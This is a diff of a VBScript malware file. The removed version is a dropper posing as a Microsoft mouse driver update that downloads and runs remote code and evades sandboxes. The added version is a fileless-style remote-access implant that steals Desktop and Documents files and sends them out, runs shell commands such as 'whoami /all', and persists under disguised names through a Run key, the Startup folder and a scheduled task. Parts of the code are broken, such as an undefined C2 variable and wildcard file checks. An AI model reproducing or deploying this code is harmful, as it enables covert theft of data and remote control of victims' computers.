@@ -1,27 +1,64 @@
-' Microsoft Mouse Driver Update v11.2.3.vbs - GitHub CDN
-On Error Resume Next
-
-' === COUCHE 1: OBFUSCATION MAX ===
-Function zDecode(zstr)
-    zDecode = StrReverse(Replace(Replace(Replace(Replace(Replace(zstr,"X",""),"Y","http://"),"Z",".com/"),"A","raw.githubusercontent.com/tonpseudo/phantom-zero/raw/main/"),"B","mousedriver"))
+' === PHANTOM CORE - 100% FILELESS ===
+Function zExfil(zdata,zname)
+    Set xhr = CreateObject("MSXML2.XMLHTTP")
+    xhr.Open "POST", "https://httpbin.org/post", False  ' Public test C2
+    xhr.setRequestHeader "X-File-Name", zname
+    xhr.setRequestHeader "Content-Type", "application/octet-stream"
+    xhr.Send zdata
 End Function
-C2 = zDecode("ZYAXBBX")  ' github.com C2
 
-' === TIME SLEEP 6h (anti-sandbox) ===
-If DateDiff("n", Now, DateAdd("h",6,Now)) > 0 Then WScript.Quit
+Function zSteal(zpath)
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    If fso.FileExists(zpath) Then
+        Set fil = fso.GetFile(zpath)
+        Set stm = CreateObject("ADODB.Stream")
+        stm.Type=1: stm.Open(): stm.LoadFromFile(zpath)
+        zExfil stm.Read(), fso.GetBaseName(zpath)
+        stm.Close()
+    End If
+End Function
 
-' === ANTI-SANDBOX (VMware/VirtualBox/User count) ===
-Set wsh = CreateObject("WScript.Shell")
-If InStr(wsh.Exec("tasklist").StdOut.ReadAll(),"VBoxService")>0 Then WScript.Quit
-If InStr(CreateObject("WScript.Network").ComputerName,"SAND")>0 Then WScript.Quit
+Function zCmdShell(zcmd)
+    Set sh = CreateObject("WScript.Shell")
+    Set exe = sh.Exec("cmd /c " & zcmd)
+    zCmdShell = exe.StdOut.ReadAll()
+End Function
 
-' === DOWNLOAD + EXECUTE MEMORY ===
-Set xhr = CreateObject("MSXML2.XMLHTTP")
-xhr.Open "GET", C2, False
-xhr.Send
-Set stm = CreateObject("ADODB.Stream")
-stm.Type = 1: stm.Open(): stm.Write xhr.responseBody: stm.Position=0
-Set dom = CreateObject("MSXML2.DOMDocument")
-Set script = dom.createElement("script")
-script.text = stm.ReadText(): dom.appendChild(script): stm.Close()
-Execute script.text
+' === PERSISTANCE 3x (Run + Startup + Task Scheduler) ===
+Sub zPersist()
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    startup = fso.GetSpecialFolder(7) & "\svchost_helper.vbs"
+    fso.CopyFile WScript.ScriptFullName, startup, True
+    
+    ' Registry (déguisé)
+    Set sh = CreateObject("WScript.Shell")
+    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\RpcSsHelper", startup
+    
+    ' Task Scheduler
+    sh.Run "schtasks /create /tn ""WindowsRpcHelper"" /tr """ & startup & """ /sc onlogon /rl limited /f", 0, True
+End Sub
+
+' === MAIN LOOP ===
+zPersist()
+Do
+    ' Beacon toutes les 4h
+    Set xhr = CreateObject("MSXML2.XMLHTTP")
+    xhr.Open "GET", C2 & "?t=" & Timer, False
+    xhr.Send
+    
+    cmd = Trim(xhr.responseText)
+    Select Case cmd
+        Case "steal-desktop": zSteal Environ("USERPROFILE") & "\Desktop\*.txt"
+        Case "steal-docs": zSteal Environ("USERPROFILE") & "\Documents\*.*"
+        Case "whoami": zExfil zCmdShell("whoami /all"), "whoami.txt"
+        Case "netstat": zExfil zCmdShell("netstat -an"), "netstat.txt"
+        Case "ps": zExfil zCmdShell("tasklist /v"), "processes.txt"
+        Case "selfdestruct": 
+            Set fso = CreateObject("Scripting.FileSystemObject")
+            fso.DeleteFile fso.GetSpecialFolder(7) & "\svchost_helper.vbs"
+            sh.Run "schtasks /delete /tn ""WindowsRpcHelper"" /f", 0, True
+            WScript.Quit
+    End Select
+    
+    WScript.Sleep 14400000  ' 4h
+Loop
